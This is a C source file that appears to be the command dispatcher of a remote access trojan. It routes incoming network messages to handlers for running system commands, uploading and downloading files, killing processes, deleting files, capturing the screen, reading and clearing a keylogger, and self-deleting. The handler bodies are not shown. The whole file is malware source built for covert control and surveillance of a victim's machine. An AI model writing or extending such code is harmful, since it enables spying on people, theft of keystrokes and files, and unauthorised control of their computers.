#include "commands/cmds.h"
#include "net/interface.h"
#include "types.h"

int cmds_Translate(uint8* msg)
{
	int rv = 0;
	uint8 cmd = msg[0];

	if(cmd == CMDS_SEND)
	{
		return cmds_SEND(msg + 1);
	}else if(cmd == CMDS_TERMINATE){
		return cmds_TERMINATE();
	}else if(cmd == CMDS_INFO){
		return cmds_INFO();
	}else if(cmd == CMDS_SYSTEM){
		return cmds_SYSTEM(msg + 1);
	}else if(cmd == CMDS_TASK_LIST){
		return cmds_TASKLIST();
	}else if(cmd == CMDS_TASK_KILL){
		return cmds_TASKKILL(msg + 1);
	}else if(cmd == CMDS_DISK_LIST){
		return cmds_DISKLIST();
	}else if(cmd == CMDS_HDD_CD){
		rv = cmds_CD(msg + 1);

		net_SetBuffer(NET_BUFFSIZE);
		
		return rv;
	}else if(cmd == CMDS_HDD_LS){
		rv = cmds_LS(msg + 1);

		net_SetBuffer(NET_BUFFSIZE);
		
		return rv;
	}else if(cmd == CMDS_HDD_REMOVE){
		return cmds_REMOVE(msg + 1);
	}else if(cmd == CMDS_FILE_SEND){
		return cmds_FILESEND(msg + 1);
	}else if(cmd == CMDS_FILE_GET){
		return cmds_FILEGET(msg + 1);
	}else if(cmd == CMDS_MESSAGE_BOX){
		return cmds_MESSAGEBOX(msg + 1);
	}else if(cmd == CMDS_SELF_DEL){
		return cmds_SELFDEL();
	}else if(cmd == CMDS_SCREEN_GET){
		rv = cmds_SCREENGET(msg + 1);
		net_SetBuffer(NET_BUFFSIZE);

		return rv;
	}else if(cmd == CMDS_KEYLOGGER_INFO){
		return cmds_KEYLOGGER_INFO();
	}else if(cmd == CMDS_KEYLOGGER_CLEAR){
		return cmds_KEYLOGGER_CLEAR();
	}else if(cmd == CMDS_SCREEN_CAP){
		rv = cmds_SCREENCAP(msg + 1);
		net_SetBuffer(NET_BUFFSIZE);
		
		return rv;
	}else if(cmd == CMDS_KEYLOGGER_GET){
		return cmds_KEYLOGGER_GET();
	}

	return 1;
}